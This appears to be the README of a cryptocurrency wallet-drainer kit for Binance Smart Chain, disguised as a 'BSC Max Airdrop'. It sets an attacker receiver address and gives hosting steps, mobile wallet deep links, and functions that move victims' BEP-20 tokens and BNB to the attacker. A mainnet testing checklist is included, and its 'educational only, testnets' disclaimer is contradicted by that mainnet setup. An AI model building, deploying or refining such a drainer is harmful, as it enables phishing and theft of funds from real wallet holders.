# BSC Drainer - Binance Smart Chain Version

This is a BSC (Binance Smart Chain) version of the Ethereum wallet drainer, adapted to work with the BSC network and BEP-20 tokens.

## Key Changes from ETH Version

### Network Configuration
- **Chain ID**: Changed from 1 (Ethereum) to 56 (BSC Mainnet)
- **Native Token**: Changed from ETH to BNB
- **RPC URLs**: Updated to BSC endpoints
- **Block Explorer**: Updated to BSCScan

### Token Contracts
Updated to popular BEP-20 tokens on BSC:
- USDT (BSC): `0x55d398326f99059fF775485246999027B3197955`
- USDC (BSC): `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d`
- BUSD: `0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56`
- CAKE (PancakeSwap): `0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82`
- WBNB: `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c`
- BTCB: `0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c`
- ETH (BSC): `0x2170Ed0880ac9A755fd29B2688956BD959F933F8`
- And many more popular BSC tokens...

### Wallet Support
Enhanced mobile wallet support for BSC-compatible wallets:
- MetaMask
- Trust Wallet (with BSC coin_id)
- Binance Wallet
- TokenPocket
- SafePal
- Math Wallet
- WalletConnect (configured for BSC)

### Branding Changes
- Changed from "EthMax Airdrop" to "BSC Max Airdrop"
- Updated UI colors to BSC theme (gold/yellow)
- Changed references from ETH to BNB
- Updated network switching logic for BSC

### Technical Improvements
- Automatic BSC network addition if not present in wallet
- BSC-specific deep links for mobile wallets
- Gas optimization for BSC (typically lower gas costs)
- Support for both desktop and mobile BSC wallets

## Files Structure

```
bsc-drainer/
├── index.html          # Main HTML file with BSC branding
├── scripts/
│   └── scripts.js      # Main JavaScript with BSC adaptations
└── README.md          # This documentation
```

## Setup Instructions

1. **Update Receiver Address**:
   ```javascript
   const RECEIVER_ADDRESS = "0xYourBSCAddressHere";
   ```

2. **Host the Files**:
   - Upload to any web server
   - Ensure HTTPS for wallet connections
   - Test on both desktop and mobile

3. **Verify Network Settings**:
   - BSC Mainnet Chain ID: 56
   - RPC URL: https://bsc-dataseed.binance.org/
   - Block Explorer: https://bscscan.com/

## Key Functions

### `drainWallet()`
Main function that orchestrates the draining process:
1. Drains BEP-20 tokens first (requires BNB for gas)
2. Drains remaining BNB last

### `drainBEP20Token()`
Handles individual BEP-20 token transfers:
- Checks token balance
- Estimates gas costs
- Transfers tokens to receiver address

### `drainBNB()`
Handles final BNB transfer:
- Calculates precise gas costs
- Leaves exact amount needed for gas
- Transfers remaining BNB

### Network Switching
Automatically switches to BSC Mainnet or adds the network if not present:
```javascript
// Switch to BSC
chainId: '0x38' // BSC Mainnet

// Add BSC network if not present
{
    chainId: '0x38',
    chainName: 'BSC Mainnet',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
}
```

## Mobile Wallet Deep Links

BSC-specific deep links for popular mobile wallets:
- Trust Wallet: Uses BSC coin_id (56)
- TokenPocket: BSC-compatible link format
- Binance Wallet: Official Binance Smart Chain link
- SafePal: BSC-enabled deep link

## Gas Optimization

BSC typically has lower gas costs than Ethereum:
- Standard transfer: ~21,000 gas
- Token transfer: ~50,000-65,000 gas
- Gas price: Usually 5-20 gwei on BSC

## Testing Checklist

- [ ] Connects to BSC Mainnet (Chain ID: 56)
- [ ] Detects BEP-20 token balances
- [ ] Estimates gas costs correctly
- [ ] Transfers tokens successfully
- [ ] Drains BNB with precise gas calculation
- [ ] Works on mobile wallets
- [ ] WalletConnect functions properly
- [ ] Network switching works
- [ ] Error handling for insufficient funds

## Security Considerations

⚠️ **Important**: This tool is designed for educational purposes and demonstrates how wallet draining attacks work. Ensure you:

1. Only use on testnets for learning
2. Never target real users' wallets
3. Understand the legal implications
4. Use responsibly for security research

## Browser Compatibility

- Chrome/Chromium browsers
- Firefox
- Safari (with some limitations)
- Mobile browsers with wallet apps installed

## Common Issues

1. **Network Not Switching**: Some wallets require manual network addition
2. **Mobile Connection Timeout**: Increase timeout values if needed
3. **Gas Estimation Failures**: Fallback to conservative gas limits
4. **Token Detection**: Some tokens may have different ABIs

## Development Notes

- Built with ethers.js v5.7.2
- jQuery for DOM manipulation
- WalletConnect v2 for mobile connections
- Responsive design for mobile/desktop
- BSC-optimized gas calculations
